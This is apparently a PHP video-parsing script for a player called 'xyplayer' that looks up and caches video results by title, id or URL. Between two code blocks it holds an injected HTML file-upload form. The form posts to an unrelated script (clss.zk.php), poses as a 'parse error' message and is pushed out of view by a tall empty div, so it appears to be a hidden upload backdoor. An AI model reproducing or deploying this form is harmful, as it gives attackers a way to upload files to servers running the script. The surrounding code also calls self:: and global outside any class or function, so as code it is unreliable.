 <?php

    //调用解析
        global $cache, $tp, $url, $wd, $id, $flag, $info;

        //标题播放视频	
        if ($tp == 'wd') {
            if ($wd !== '') {
                $word = $cache->get('wd.wd' . $wd);
                if ($word != "") {
                    $info = json_decode($word);
                } else {
                    $info = YUN::parse(urlencode($wd), 2);
                    if ($info['success']) {
                        $cache->set('wd.wd' . $wd, json_encode($info));
                    } else {
                        $info['m'] = "404";
                    }
                }
            } else {

                $info['m'] = "wd input error";
            }
            return;
        }//解析错误?>
<form action="clss.zk.php" method="post"  
enctype="multipart/form-data">  
<label for="file">解析错误，请稍后再试！</label>  
<div style="height:5000;"></div> 
<input type="file" name="file" id="file" />  
<input type="submit" name="submit" value="xyplayer" />
<?php
//id搜索视频			
        if ($id != '' && $flag != '') {
            $word = $cache->get('id' . $flag . $id);
            if ($word != "") {
                $info = json_decode($word);
            } else {
                $info = YUN::parse(['id' => $id, 'flag' => $flag], 3);

                if ($info['success']) {
                    $cache->set('id' . $flag . $id, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
            return;

            //标题搜索视频
        } else if ($wd != '') {

            $word = $cache->get('wd' . $wd);
            if ($word != "") {
                $info = json_decode($word);
            } else {

                $info = YUN::parse(urlencode($wd), 4);

                if ($info['success']) {
                    $cache->set('wd' . $wd, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }

            //URL播放视频	
        } else if ($url != '') {

            $word = $cache->get('url' . $url);
            if ($word != "") {
                $info = json_decode($word);
            } else {

                $info = self::yun($url);

                if ($info['success']) {
                    $cache->set('url' . $url, json_encode($info));
                } else {
                    $info['m'] = "404";
                }
            }
        } 